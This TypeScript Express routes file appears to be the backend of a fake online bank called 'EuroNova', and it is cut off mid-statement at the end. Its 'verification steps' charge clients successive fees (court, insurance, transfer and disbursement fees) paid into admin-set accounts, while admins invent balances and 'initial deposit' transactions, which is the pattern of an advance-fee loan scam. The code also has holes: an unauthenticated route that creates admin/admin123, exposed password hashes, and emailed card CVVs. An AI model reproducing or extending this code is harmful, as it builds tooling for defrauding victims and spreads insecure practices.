import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { setupAuth, hashPassword, generateSecurePassword } from "./auth";
import { 
  sendEmailByType, 
  checkApiKey, 
  sendEmail, 
  sendWelcomeEmail,
  sendTransactionEmail,
  sendPaymentReminderEmail,
  sendAccountStatusEmail
} from "./email";
import { z } from "zod";
import { 
  insertUserSchema, 
  insertAccountSchema, 
  insertCardSchema, 
  insertTransactionSchema, 
  insertVerificationStepSchema,
  insertSystemSettingSchema
} from "@shared/schema";
import { randomBytes } from "crypto";

// Role middleware
const requireRole = (role: string) => (req: Request, res: Response, next: Function) => {
  if (!req.isAuthenticated()) {
    return res.status(401).json({ message: "Not authenticated" });
  }
  
  if (req.user && req.user.role !== role) {
    console.log(`Role check failed: User role is ${req.user.role}, required role is ${role}`);
    return res.status(403).json({ message: "Not authorized" });
  }
  
  next();
};

// Middleware to check if user is authenticated
const isAuthenticated = (req: Request, res: Response, next: Function) => {
  if (!req.isAuthenticated()) {
    return res.status(401).json({ message: "Not authenticated" });
  }
  
  next();
};

// Configuration pour afficher les logs complets des erreurs d'API
const logFullError = (error: any) => {
  console.error("ERREUR COMPLÈTE:", JSON.stringify(error, null, 2));
  if (error.response) {
    console.error("DONNÉES DE RÉPONSE:", JSON.stringify(error.response.data, null, 2));
  }
};

export async function registerRoutes(app: Express): Promise<Server> {
  // Vérifier la clé API Brevo
  const isApiKeyValid = await checkApiKey();
  console.log(`Clé API Brevo vérifiée. Valide: ${isApiKeyValid}`);
  
  // Setup auth routes
  setupAuth(app);
  
  // Route pour initialiser un admin (temporaire pour le debug)
  app.get('/api/init-admin', async (req, res) => {
    try {
      // Vérifier si admin existe déjà
      const existingAdmin = await storage.getUserByUsername('admin');
      if (existingAdmin) {
        return res.status(200).json({ message: "Admin existe déjà", id: existingAdmin.id });
      }
      
      // Hacher le mot de passe
      const hashedPassword = await hashPassword('admin123');
      
      // Créer un nouvel utilisateur admin
      const admin = await storage.createUser({
        username: 'admin',
        password: hashedPassword,
        email: 'admin@euronova.com',
        firstName: 'Admin',
        lastName: 'User',
        role: 'admin',
        isActive: true
      });
      
      res.status(201).json({ message: "Admin créé avec succès", id: admin.id });
    } catch (error) {
      console.error("Error creating admin:", error);
      res.status(500).json({ message: "Error creating admin" });
    }
  });
  
  // User routes
  app.get('/api/users', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      const users = await storage.getAllUsers();
      
      // Remove passwords from the response
      const safeUsers = users.map(user => {
        const { password, ...safeUser } = user;
        return safeUser;
      });
      
      res.status(200).json(safeUsers);
    } catch (error) {
      console.error("Error fetching users:", error);
      res.status(500).json({ message: "Error fetching users" });
    }
  });
  
  app.get('/api/users/:id', isAuthenticated, async (req, res) => {
    try {
      const userId = parseInt(req.params.id);
      
      // Allow admins or the user themselves
      if (req.user.role !== 'admin' && req.user.id !== userId) {
        return res.status(403).json({ message: "Not authorized" });
      }
      
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Remove password from the response
      const { password, ...safeUser } = user;
      
      res.status(200).json(safeUser);
    } catch (error) {
      console.error("Error fetching user:", error);
      res.status(500).json({ message: "Error fetching user" });
    }
  });
  
  // Route pour obtenir les détails complets d'un utilisateur (RIB, etc.) - Admin seulement
  app.get('/api/users/:id/details', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      const userId = parseInt(req.params.id);
      
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Récupérer les comptes
      const accounts = await storage.getAccountsByUserId(userId);
      
      // Récupérer les cartes
      const cards = [];
      for (const account of accounts) {
        const accountCards = await storage.getCardsByAccountId(account.id);
        cards.push(...accountCards);
      }
      
      // Pour les admins, ne pas masquer le mot de passe
      const userDetails = {
        ...user,
        accounts,
        cards
      };
      
      res.status(200).json(userDetails);
    } catch (error) {
      console.error("Error fetching user details:", error);
      res.status(500).json({ message: "Error fetching user details" });
    }
  });
  
  // Route pour renvoyer les identifiants et RIB aux clients
  app.post('/api/users/:id/resend-credentials', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      const userId = parseInt(req.params.id);
      
      // Récupérer l'utilisateur
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "Utilisateur non trouvé" });
      }
      
      // Récupérer le compte principal de l'utilisateur
      const accounts = await storage.getAccountsByUserId(userId);
      if (!accounts || accounts.length === 0) {
        return res.status(404).json({ message: "Aucun compte bancaire trouvé pour cet utilisateur" });
      }
      
      const account = accounts[0];
      
      // Récupérer la carte associée au compte
      const cards = await storage.getCardsByAccountId(account.id);
      const card = cards && cards.length > 0 ? cards[0] : null;
      
      // Générer un nouveau mot de passe si demandé
      const generateNewPassword = req.body.generateNewPassword === true;
      let newPassword = null;
      
      if (generateNewPassword) {
        newPassword = generateSecurePassword();
        const hashedPassword = await hashPassword(newPassword);
        await storage.updateUser(userId, { password: hashedPassword });
      }
      
      // Vérifier et mettre à jour les transactions pour s'assurer que le solde initial est bien enregistré
      const transactions = await storage.getTransactionsByAccountId(account.id);
      
      // Si aucune transaction n'existe et que le solde est positif, créer une transaction de dépôt initial
      if (transactions.length === 0 && account.balance > 0) {
        console.log(`Aucune transaction trouvée pour le compte ${account.id} avec un solde de ${account.balance}. Création d'une transaction de dépôt initial.`);
        
        const depositTransaction = {
          type: 'deposit' as const,
          amount: account.balance,
          status: 'completed' as const,
          description: 'Dépôt initial',
          currency: 'EUR',
          toAccountId: account.id,
          reference: `DEP-${Date.now()}`,
          category: 'deposit' as const,
          fromAccountId: null
        };
        
        try {
          // Utiliser la méthode publique pour créer la transaction
          const transaction = await storage.createTransaction(depositTransaction);
          console.log(`Transaction de dépôt initial créée avec ID ${transaction.id} pour le montant ${account.balance}€`);
          
          // Créer une notification pour informer le client du dépôt initial
          await storage.createNotification({
            userId: user.id,
            type: 'transaction',
            title: 'Dépôt initial effectué',
            message: `Un dépôt initial de ${account.balance}€ a été effectué sur votre compte.`,
            isRead: false
          });
          
          // Envoi d'un email de notification de transaction
          await sendEmailByType('transaction', user, {
            transaction,
            account
          });
        } catch (error) {
          console.error("Erreur lors de la création de la transaction initiale:", error);
        }
      }
      
      // Envoyer l'email avec les informations d'identification
      console.log(`Renvoi des identifiants à ${user.email}`);
      
      const emailResult = await sendEmailByType("welcome", user, {
        accountNumber: account.accountNumber,
        clientId: user.username,
        password: newPassword, // Sera null si aucun nouveau mot de passe n'est généré
        cardNumber: card ? card.cardNumber : undefined,
        cardExpiryDate: card ? card.expiryDate : undefined,
        cardCvv: card ? card.cvv : undefined
      });
      
      // Créer une notification pour l'utilisateur
      await storage.createNotification({
        userId: user.id,
        title: "Informations d'identification renvoyées",
        type: "welcome",
        message: "Vos informations d'identification ont été renvoyées par email.",
        isRead: false
      });
      
      if (emailResult) {
        return res.status(200).json({ 
          message: "Identifiants renvoyés avec succès",
          emailSent: true,
          newPasswordGenerated: generateNewPassword
        });
      } else {
        return res.status(500).json({ 
          message: "Erreur lors de l'envoi de l'email, mais les informations ont été traitées",
          emailSent: false,
          newPasswordGenerated: generateNewPassword
        });
      }
    } catch (error) {
      console.error("Error resending credentials:", error);
      res.status(500).json({ message: "Erreur lors du renvoi des identifiants" });
    }
  });
  
  // Route spécifique pour mettre à jour la langue de l'utilisateur
  app.patch('/api/users/:id/language', isAuthenticated, async (req, res) => {
    try {
      const userId = parseInt(req.params.id);
      
      // Allow admins or the user themselves
      if (req.user.role !== 'admin' && req.user.id !== userId) {
        return res.status(403).json({ message: "Not authorized" });
      }
      
      // Validate the language code
      const { language } = req.body;
      if (!language) {
        return res.status(400).json({ message: "Language is required" });
      }
      
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Update user language
      const updatedUser = await storage.updateUser(userId, { language });
      if (!updatedUser) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Remove password from the response
      const { password, ...safeUser } = updatedUser;
      
      res.status(200).json(safeUser);
    } catch (error) {
      console.error("Error updating user language:", error);
      res.status(500).json({ message: "Error updating user language" });
    }
  });
  
  app.patch('/api/users/:id', isAuthenticated, async (req, res) => {
    try {
      const userId = parseInt(req.params.id);
      
      // Allow admins or the user themselves
      if (req.user.role !== 'admin' && req.user.id !== userId) {
        return res.status(403).json({ message: "Not authorized" });
      }
      
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Don't allow changing role unless admin
      if (req.body.role && req.user.role !== 'admin') {
        delete req.body.role;
      }
      
      // Don't allow changing password through this endpoint
      delete req.body.password;
      
      const updatedUser = await storage.updateUser(userId, req.body);
      if (!updatedUser) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // If status changed, send email notification
      if (req.body.isActive !== undefined && user.isActive !== req.body.isActive) {
        await sendEmailByType('status', user, { isActive: req.body.isActive });
        
        // Also create notification
        await storage.createNotification({
          userId: user.id,
          type: 'status',
          title: `Compte ${req.body.isActive ? 'activé' : 'désactivé'}`,
          message: `Votre compte a été ${req.body.isActive ? 'activé' : 'désactivé'}.`,
          isRead: false
        });
      }
      
      // Remove password from the response
      const { password, ...safeUser } = updatedUser;
      
      res.status(200).json(safeUser);
    } catch (error) {
      console.error("Error updating user:", error);
      res.status(500).json({ message: "Error updating user" });
    }
  });
  
  // Account routes
  app.get('/api/accounts', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      // Get all users
      const users = await storage.getAllUsers();
      
      // For each user, get their accounts
      const accountsPromises = users.map(async user => {
        const accounts = await storage.getAccountsByUserId(user.id);
        
        // For each account, get the transactions to check if we need to create a deposit transaction
        for (const account of accounts) {
          // Check if the account has transactions but has a balance
          const transactions = await storage.getTransactionsByAccountId(account.id);
          
          // If no transactions exist and the balance is positive, create a deposit transaction
          if (transactions.length === 0 && account.balance > 0) {
            console.log(`No transactions found for account ${account.id} with balance ${account.balance}. Creating initial deposit transaction.`);
            
            const depositTransaction = {
              type: 'deposit',
              amount: account.balance,
              status: 'completed',
              description: 'Dépôt initial',
              currency: 'EUR',
              toAccountId: account.id,
              reference: `DEP-${Date.now()}`,
              category: 'deposit',
              fromAccountId: null
            };
            
            // Direct access to storage properties for this fix
            // @ts-ignore
            const transactionId = storage.currentId.transactions++;
            const transaction = {
              ...depositTransaction,
              id: transactionId,
              createdAt: new Date()
            };
            
            // @ts-ignore
            storage.transactions.set(transactionId, transaction);
            
            console.log(`Initial deposit transaction created with ID ${transactionId} for amount ${account.balance}€`);
          }
        }
        
        return accounts.map(account => ({
          ...account,
          user: {
            id: user.id,
            username: user.username,
            firstName: user.firstName,
            lastName: user.lastName,
            email: user.email
          }
        }));
      });
      
      const accountsByUser = await Promise.all(accountsPromises);
      const allAccounts = accountsByUser.flat();
      
      res.status(200).json(allAccounts);
    } catch (error) {
      console.error("Error fetching accounts:", error);
      res.status(500).json({ message: "Error fetching accounts" });
    }
  });
  
  app.get('/api/accounts/user', isAuthenticated, async (req, res) => {
    try {
      console.log(`Récupération des comptes pour l'utilisateur ${req.user.id}`);
      const accounts = await storage.getAccountsByUserId(req.user.id);
      console.log(`${accounts.length} comptes trouvés`);
      
      // Pour chaque compte, vérifier s'il a des transactions mais a un solde
      for (const account of accounts) {
        console.log(`Vérification des transactions pour le compte ${account.id} avec solde ${account.balance}`);
        
        // Récupérer les transactions pour ce compte
        const transactions = await storage.getTransactionsByAccountId(account.id);
        console.log(`${transactions.length} transactions trouvées pour le compte ${account.id}`);
        
        // Si aucune transaction n'existe et que le solde est positif, créer une transaction de dépôt
        if (transactions.length === 0 && account.balance > 0) {
          console.log(`Aucune transaction trouvée pour un compte avec solde. Création d'une transaction de dépôt initial pour le compte ${account.id} avec solde ${account.balance}`);
          
          try {
            // Créer une transaction de dépôt initial
            const depositTransaction = await storage.createTransaction({
              type: 'deposit',
              amount: account.balance,
              status: 'completed',
              description: 'Dépôt initial',
              currency: 'EUR',
              toAccountId: account.id,
              reference: `DEP-${Date.now()}`,
              category: 'deposit',
              fromAccountId: null
            });
            
            console.log(`Transaction de dépôt initial créée avec ID ${depositTransaction.id}`);
            
            // Créer une notification pour l'utilisateur
            await storage.createNotification({
              userId: req.user.id,
              type: 'transaction',
              title: 'Dépôt initial effectué',
              message: `Un dépôt initial de ${account.balance}€ a été effectué sur votre compte.`,
              isRead: false
            });
          } catch (error) {
            console.error("Erreur lors de la création de la transaction initiale:", error);
          }
        }
      }
      
      res.status(200).json(accounts);
    } catch (error) {
      console.error("Error fetching user accounts:", error);
      res.status(500).json({ message: "Error fetching user accounts" });
    }
  });
  
  // Nouvel endpoint pour récupérer les comptes d'un utilisateur spécifique (pour les admins)
  app.get('/api/users/:userId/accounts', requireRole("admin"), async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      
      if (isNaN(userId)) {
        return res.status(400).json({ message: "Invalid user ID" });
      }
      
      console.log(`[ADMIN] Récupération des comptes pour l'utilisateur ${userId}`);
      const accounts = await storage.getAccountsByUserId(userId);
      console.log(`[ADMIN] ${accounts.length} comptes trouvés pour l'utilisateur ${userId}`);
      
      res.status(200).json(accounts);
    } catch (error) {
      console.error(`Error fetching accounts for user ${req.params.userId}:`, error);
      res.status(500).json({ message: "Error fetching user accounts" });
    }
  });
  
  app.get('/api/accounts/:id', isAuthenticated, async (req, res) => {
    try {
      const accountId = parseInt(req.params.id);
      const account = await storage.getAccount(accountId);
      
      if (!account) {
        return res.status(404).json({ message: "Account not found" });
      }
      
      // Allow admins or the account owner
      if (req.user.role !== 'admin' && req.user.id !== account.userId) {
        return res.status(403).json({ message: "Not authorized" });
      }
      
      res.status(200).json(account);
    } catch (error) {
      console.error("Error fetching account:", error);
      res.status(500).json({ message: "Error fetching account" });
    }
  });
  
  app.post('/api/accounts', isAuthenticated, async (req, res) => {
    try {
      const accountData = insertAccountSchema.parse(req.body);
      
      console.log("Creating account with data:", JSON.stringify(accountData));
      
      // Ensure balance is converted to a number if it's a string
      if (typeof accountData.balance === 'string') {
        accountData.balance = parseFloat(accountData.balance);
      }
      
      const account = await storage.createAccount(accountData);
      
      console.log("Account created:", JSON.stringify(account));
      
      // If initial balance is provided and greater than 0, create a deposit transaction
      if (account.balance > 0) {
        const depositTransaction = {
          type: 'deposit',
          amount: account.balance,
          status: 'completed',
          description: 'Dépôt initial',
          currency: 'EUR',
          toAccountId: account.id,
          reference: `DEP-${Date.now()}`,
          category: 'deposit'
        };
        
        console.log("Creating initial deposit transaction:", JSON.stringify(depositTransaction));
        
        // Note: Don't use createTransaction as it would double-count the balance
        // Just store the transaction for record keeping
        const transactionId = storage.currentId.transactions++;
        const transaction = {
          ...depositTransaction,
          id: transactionId,
          createdAt: new Date(),
          fromAccountId: null
        };
        
        storage.transactions.set(transactionId, transaction);
        
        console.log("Initial deposit transaction created:", JSON.stringify(transaction));
      }
      
      // After creating an account, fetch the user to send welcome email
      const user = await storage.getUser(account.userId);
      if (user) {
        await sendEmailByType('welcome', user, { accountNumber: account.accountNumber });
      }
      
      res.status(201).json(account);
    } catch (error) {
      console.error("Error creating account:", error);
      
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid account data", errors: error.errors });
      }
      
      res.status(500).json({ message: "Error creating account" });
    }
  });
  
  app.patch('/api/accounts/:id', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      const accountId = parseInt(req.params.id);
      const account = await storage.getAccount(accountId);
      
      if (!account) {
        return res.status(404).json({ message: "Account not found" });
      }
      
      const updatedAccount = await storage.updateAccount(accountId, req.body);
      if (!updatedAccount) {
        return res.status(404).json({ message: "Account not found" });
      }
      
      res.status(200).json(updatedAccount);
    } catch (error) {
      console.error("Error updating account:", error);
      res.status(500).json({ message: "Error updating account" });
    }
  });
  
  // Card routes
  app.get('/api/cards', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      // Get all cards (admin only)
      const users = await storage.getAllUsers();
      
      // For each user, get their cards
      const cardsPromises = users.map(async user => {
        const cards = await storage.getCardsByUserId(user.id);
        return cards.map(card => ({
          ...card,
          user: {
            id: user.id,
            username: user.username,
            firstName: user.firstName,
            lastName: user.lastName,
            email: user.email
          }
        }));
      });
      
      const cardsByUser = await Promise.all(cardsPromises);
      const allCards = cardsByUser.flat();
      
      res.status(200).json(allCards);
    } catch (error) {
      console.error("Error fetching all cards:", error);
      res.status(500).json({ message: "Error fetching all cards" });
    }
  });
  
  app.get('/api/cards/user', isAuthenticated, async (req, res) => {
    try {
      const cards = await storage.getCardsByUserId(req.user.id);
      res.status(200).json(cards);
    } catch (error) {
      console.error("Error fetching user cards:", error);
      res.status(500).json({ message: "Error fetching user cards" });
    }
  });
  
  app.get('/api/cards/account/:accountId', isAuthenticated, async (req, res) => {
    try {
      const accountId = parseInt(req.params.accountId);
      const account = await storage.getAccount(accountId);
      
      if (!account) {
        return res.status(404).json({ message: "Account not found" });
      }
      
      // Allow admins or the account owner
      if (req.user.role !== 'admin' && req.user.id !== account.userId) {
        return res.status(403).json({ message: "Not authorized" });
      }
      
      const cards = await storage.getCardsByAccountId(accountId);
      res.status(200).json(cards);
    } catch (error) {
      console.error("Error fetching account cards:", error);
      res.status(500).json({ message: "Error fetching account cards" });
    }
  });
  
  app.post('/api/cards', isAuthenticated, async (req, res) => {
    try {
      const cardData = insertCardSchema.parse(req.body);
      
      // If not admin, can only create card for own account
      if (req.user.role !== 'admin') {
        const account = await storage.getAccount(cardData.accountId);
        if (!account || account.userId !== req.user.id) {
          return res.status(403).json({ message: "Not authorized" });
        }
        
        // Also set userId to the user's ID
        cardData.userId = req.user.id;
      }
      
      const card = await storage.createCard(cardData);
      res.status(201).json(card);
    } catch (error) {
      console.error("Error creating card:", error);
      
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid card data", errors: error.errors });
      }
      
      res.status(500).json({ message: "Error creating card" });
    }
  });
  
  app.patch('/api/cards/:id', isAuthenticated, async (req, res) => {
    try {
      const cardId = parseInt(req.params.id);
      const card = await storage.getCard(cardId);
      
      if (!card) {
        return res.status(404).json({ message: "Card not found" });
      }
      
      // Allow admins or the card owner
      if (req.user.role !== 'admin' && req.user.id !== card.userId) {
        return res.status(403).json({ message: "Not authorized" });
      }
      
      const updatedCard = await storage.updateCard(cardId, req.body);
      if (!updatedCard) {
        return res.status(404).json({ message: "Card not found" });
      }
      
      res.status(200).json(updatedCard);
    } catch (error) {
      console.error("Error updating card:", error);
      res.status(500).json({ message: "Error updating card" });
    }
  });
  
  // Transaction routes
  app.get('/api/transactions/account/:accountId', isAuthenticated, async (req, res) => {
    try {
      const accountId = parseInt(req.params.accountId);
      
      // Si l'accountId est 0 ou invalide, retourner un tableau vide au lieu d'une erreur
      if (!accountId || isNaN(accountId)) {
        console.log(`ID de compte invalide fourni: ${req.params.accountId}`);
        return res.status(200).json([]);
      }
      
      console.log(`Recherche du compte avec ID: ${accountId} par l'utilisateur ${req.user.id} (${req.user.role})`);
      const account = await storage.getAccount(accountId);
      
      if (!account) {
        console.log(`Compte introuvable pour ID: ${accountId}`);
        return res.status(200).json([]); // Retourner un tableau vide plutôt qu'une erreur 404
      }
      
      console.log(`Compte trouvé: ${account.id}, UserId: ${account.userId}, Balance: ${account.balance}, Type: ${account.accountType}`);
      
      // Allow admins or the account owner
      if (req.user.role !== 'admin' && req.user.id !== account.userId) {
        console.log(`Accès refusé: l'utilisateur ${req.user.id} n'est pas autorisé à voir les transactions du compte ${accountId}`);
        return res.status(403).json({ message: "Not authorized" });
      }
      
      // Récupérer les transactions pour ce compte
      const transactions = await storage.getTransactionsByAccountId(accountId);
      console.log(`Récupération de ${transactions.length} transactions pour le compte ${accountId} avec balance ${account.balance}`);
      
      // Si aucune transaction n'est trouvée mais que le compte a un solde, créer une transaction de dépôt initial
      if (transactions.length === 0 && account.balance > 0) {
        console.log(`Aucune transaction trouvée pour un compte avec solde. Création d'une transaction de dépôt initial pour le compte ${accountId} avec un solde de ${account.balance}`);
        
        try {
          // Créer une transaction de dépôt initial
          const depositTransaction = await storage.createTransaction({
            type: 'deposit',
            amount: account.balance,
            status: 'completed',
            description: 'Dépôt initial',
            currency: 'EUR',
            toAccountId: account.id,
            reference: `DEP-${Date.now()}`,
            category: 'deposit',
            fromAccountId: null
          });
          
          console.log(`Transaction de dépôt initial créée avec ID ${depositTransaction.id}`);
          
          // Vérifier que la transaction a bien été créée
          const checkTransaction = await storage.getTransaction(depositTransaction.id);
          console.log(`Vérification de la transaction créée: ${checkTransaction ? 'Trouvée' : 'Non trouvée'}`);
          
          const allTransactions = await storage.getTransactionsByAccountId(accountId);
          console.log(`Après création, compte ${accountId} a ${allTransactions.length} transactions`);
          
          // Renvoyer la nouvelle transaction dans la réponse
          return res.status(200).json([depositTransaction]);
        } catch (error) {
          console.error("Erreur lors de la création de la transaction initiale:", error);
          // Même en cas d'erreur, on continue et on renvoie un tableau vide
          return res.status(200).json([]);
        }
      }
      
      res.status(200).json(transactions);
    } catch (error) {
      console.error("Error fetching account transactions:", error);
      res.status(500).json({ message: "Error fetching account transactions" });
    }
  });
  
  app.post('/api/transactions', isAuthenticated, async (req, res) => {
    try {
      console.log("Transaction request body:", req.body);
      
      // Vérifier que l'on a au moins un fromAccountId ou un toAccountId
      if (!req.body.fromAccountId && !req.body.toAccountId) {
        return res.status(400).json({ message: "At least one account ID (from or to) is required" });
      }
      
      // Vérifier que le montant est un nombre positif
      if (typeof req.body.amount !== 'number' || req.body.amount <= 0) {
        return res.status(400).json({ message: "Amount must be a positive number" });
      }
      
      // Assurer que les champs obligatoires sont présents
      const transactionData = {
        ...req.body,
        status: req.body.status || "completed",
        currency: req.body.currency || "EUR",
        reference: req.body.reference || null,
        description: req.body.description || null,
        category: req.body.category || null
      };
      
      // Parse avec le schema
      try {
        insertTransactionSchema.parse(transactionData);
      } catch (error) {
        console.error("Transaction validation error:", error);
        return res.status(400).json({ message: "Invalid transaction data", errors: error });
      }
      
      console.log("Validated transaction data:", transactionData);
      
      // For clients, they can only create transactions from their own accounts
      if (req.user.role !== 'admin' && transactionData.fromAccountId) {
        const fromAccount = await storage.getAccount(transactionData.fromAccountId);
        if (!fromAccount || fromAccount.userId !== req.user.id) {
          return res.status(403).json({ message: "Not authorized" });
        }
      }
      
      const transaction = await storage.createTransaction(transactionData);
      
      // Send notifications for both sender and receiver (if applicable)
      if (transaction.fromAccountId) {
        const fromAccount = await storage.getAccount(transaction.fromAccountId);
        if (fromAccount) {
          const fromUser = await storage.getUser(fromAccount.userId);
          if (fromUser) {
            // Send email
            await sendEmailByType('transaction', fromUser, { 
              transaction, 
              account: fromAccount
            });
            
            // Create notification
            await storage.createNotification({
              userId: fromUser.id,
              type: 'transaction',
              title: `Débit de ${transaction.amount}€`,
              message: transaction.description || 'Aucune description',
              isRead: false,
              metadata: { transactionId: transaction.id }
            });
          }
        }
      }
      
      if (transaction.toAccountId) {
        const toAccount = await storage.getAccount(transaction.toAccountId);
        if (toAccount) {
          const toUser = await storage.getUser(toAccount.userId);
          if (toUser) {
            // Send email
            await sendEmailByType('transaction', toUser, { 
              transaction, 
              account: toAccount
            });
            
            // Create notification
            await storage.createNotification({
              userId: toUser.id,
              type: 'transaction',
              title: `Crédit de ${transaction.amount}€`,
              message: transaction.description || 'Aucune description',
              isRead: false,
              metadata: { transactionId: transaction.id }
            });
          }
        }
      }
      
      res.status(201).json(transaction);
    } catch (error) {
      console.error("Error creating transaction:", error);
      
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid transaction data", errors: error.errors });
      }
      
      res.status(500).json({ message: "Error creating transaction" });
    }
  });
  
  // Verification steps routes
  app.get('/api/verification-steps/user', isAuthenticated, async (req, res) => {
    try {
      const verificationStep = await storage.getVerificationStepByUserId(req.user.id);
      res.status(200).json(verificationStep || null);
    } catch (error) {
      console.error("Error fetching verification steps:", error);
      res.status(500).json({ message: "Error fetching verification steps" });
    }
  });
  
  app.get('/api/verification-steps/user/:userId', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const verificationStep = await storage.getVerificationStepByUserId(userId);
      res.status(200).json(verificationStep || null);
    } catch (error) {
      console.error("Error fetching verification steps:", error);
      res.status(500).json({ message: "Error fetching verification steps" });
    }
  });
  
  app.post('/api/verification-steps', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      const stepData = insertVerificationStepSchema.parse(req.body);
      const step = await storage.createVerificationStep(stepData);
      res.status(201).json(step);
    } catch (error) {
      console.error("Error creating verification step:", error);
      
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid verification step data", errors: error.errors });
      }
      
      res.status(500).json({ message: "Error creating verification step" });
    }
  });
  
  app.patch('/api/verification-steps/:id', isAuthenticated, async (req, res) => {
    try {
      const stepId = parseInt(req.params.id);
      const step = await storage.getVerificationStep(stepId);
      
      if (!step) {
        return res.status(404).json({ message: "Verification step not found" });
      }
      
      // Allow admins or the step owner
      if (req.user.role !== 'admin' && req.user.id !== step.userId) {
        return res.status(403).json({ message: "Not authorized" });
      }
      
      // If client is updating, they can only update the step completed field
      // for the current step they're on
      if (req.user.role !== 'admin') {
        // Find which step they're on
        let currentStep = 1;
        if (step.step1Completed) currentStep = 2;
        if (step.step2Completed) currentStep = 3;
        if (step.step3Completed) currentStep = 4;
        if (step.step4Completed) currentStep = 5;
        
        // They can only complete the current step
        const allowedFields = [`step${currentStep}Completed`];
        
        // Filter the request body to only include allowed fields
        const filteredData: any = {};
        for (const field of allowedFields) {
          if (req.body[field] !== undefined) {
            filteredData[field] = req.body[field];
          }
        }
        
        // If they're completing a step, set the date
        if (filteredData[`step${currentStep}Completed`] === true) {
          filteredData[`step${currentStep}Date`] = new Date();
        }
        
        req.body = filteredData;
      } else {
        // Admin users can modify step amounts
        const amountFields = ['step1Amount', 'step2Amount', 'step3Amount', 'step4Amount', 'step5Amount'];
        const statusFields = ['step1Completed', 'step2Completed', 'step3Completed', 'step4Completed', 'step5Completed'];
        const dateFields = ['step1Date', 'step2Date', 'step3Date', 'step4Date', 'step5Date'];
        
        // Check if the admin is updating amounts
        const isUpdatingAmounts = amountFields.some(field => req.body[field] !== undefined);
        
        // If updating statuses, make sure dates are set
        for (let i = 0; i < statusFields.length; i++) {
          const statusField = statusFields[i];
          const dateField = dateFields[i];
          
          if (req.body[statusField] === true && !step[dateField]) {
            req.body[dateField] = new Date();
          }
        }
        
        // Log the custom amount update
        if (isUpdatingAmounts) {
          console.log(`Admin updating custom amounts for verification step ${stepId}: `, 
            amountFields.filter(f => req.body[f] !== undefined).reduce((acc, field) => {
              acc[field] = req.body[field];
              return acc;
            }, {} as any)
          );
        }
      }
      
      const updatedStep = await storage.updateVerificationStep(stepId, req.body);
      if (!updatedStep) {
        return res.status(404).json({ message: "Verification step not found" });
      }
      
      // For admins, if they updated a step status, send notification
      if (req.user.role === 'admin') {
        const stepFields = ['step1Completed', 'step2Completed', 'step3Completed', 'step4Completed', 'step5Completed'];
        for (let i = 0; i < stepFields.length; i++) {
          const field = stepFields[i];
          if (req.body[field] !== undefined && req.body[field] !== step[field]) {
            // Send notification to the user
            const user = await storage.getUser(step.userId);
            if (user) {
              const stepNumber = i + 1;
              const stepNames = [
                "Frais d'enregistrement de crédit",
                "Frais de virement international",
                "Frais de justice",
                "Frais d'assurance",
                "Frais d'autorisation de décaissement"
              ];
              
              if (req.body[field] === true) {
                // Step completed
                await storage.createNotification({
                  userId: user.id,
                  type: 'verification',
                  title: `Étape ${stepNumber} validée`,
                  message: `L'étape "${stepNames[i]}" a été validée.`,
                  isRead: false
                });
              } else {
                // Step uncompleted
                await storage.createNotification({
                  userId: user.id,
                  type: 'verification',
                  title: `Étape ${stepNumber} annulée`,
                  message: `La validation de l'étape "${stepNames[i]}" a été annulée.`,
                  isRead: false
                });
              }
            }
          }
        }
      }
      
      res.status(200).json(updatedStep);
    } catch (error) {
      console.error("Error updating verification step:", error);
      res.status(500).json({ message: "Error updating verification step" });
    }
  });
  
  // Notification routes
  app.get('/api/notifications', isAuthenticated, async (req, res) => {
    try {
      const notifications = await storage.getNotificationsByUserId(req.user.id);
      res.status(200).json(notifications);
    } catch (error) {
      console.error("Error fetching notifications:", error);
      res.status(500).json({ message: "Error fetching notifications" });
    }
  });
  
  app.patch('/api/notifications/:id/read', isAuthenticated, async (req, res) => {
    try {
      const notificationId = parseInt(req.params.id);
      const notification = await storage.markNotificationAsRead(notificationId);
      
      if (!notification) {
        return res.status(404).json({ message: "Notification not found" });
      }
      
      res.status(200).json(notification);
    } catch (error) {
      console.error("Error marking notification as read:", error);
      res.status(500).json({ message: "Error marking notification as read" });
    }
  });
  
  // Payment Account routes
  app.get("/api/payment-account/:stepNumber", isAuthenticated, async (req, res) => {
    try {
      const stepNumber = parseInt(req.params.stepNumber);
      if (isNaN(stepNumber) || stepNumber < 1 || stepNumber > 5) {
        return res.status(400).json({ message: "Invalid step number" });
      }
      
      const paymentAccount = await storage.getPaymentAccountForStep(stepNumber);
      if (!paymentAccount) {
        return res.status(404).json({ message: "Payment account not found for this step" });
      }
      
      res.status(200).json(paymentAccount);
    } catch (error) {
      console.error("Error fetching payment account:", error);
      res.status(500).json({ message: "Failed to fetch payment account" });
    }
  });
  
  app.post("/api/payment-account/:stepNumber", isAuthenticated, requireRole("admin"), async (req, res) => {
    try {
      const stepNumber = parseInt(req.params.stepNumber);
      if (isNaN(stepNumber) || stepNumber < 1 || stepNumber > 5) {
        return res.status(400).json({ message: "Invalid step number" });
      }
      
      const paymentAccountSchema = z.object({
        accountOwner: z.string().min(1),
        accountNumber: z.string().min(1),
        description: z.string().optional(),
        stepNumber: z.number()
      });
      
      const validatedData = paymentAccountSchema.parse({
